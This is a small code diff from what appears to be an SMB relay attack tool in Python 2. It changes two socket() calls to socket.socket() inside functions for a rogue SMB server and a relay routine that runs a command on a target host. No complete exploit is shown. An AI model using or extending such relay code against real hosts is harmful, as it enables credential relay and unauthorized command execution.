@@ -173,7 +173,7 @@ def Parse_Nego_Dialect(data):
         return "\x0a\x00"
 
 def SmbRogueSrv139(key,Target,DomainMachineName):
-    s = socket(AF_INET,SOCK_STREAM)
+    s = socket.socket(AF_INET,SOCK_STREAM)
     s.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
     s.settimeout(30)
     try:
@@ -220,7 +220,7 @@ def RunRelay(host, Command,Domain):
     Target = host
     CMD = Command
     print "Target is running: ", RunSmbFinger((host, 445))
-    s = socket(AF_INET, SOCK_STREAM)
+    s = socket.socket(AF_INET, SOCK_STREAM)
     s.connect((host, 445))
     h = SMBHeader(cmd="\x72",flag1="\x18",flag2="\x03\xc7",pid="\xff\xfe", tid="\xff\xff")
     n = SMBNego(Data = SMBNegoData())
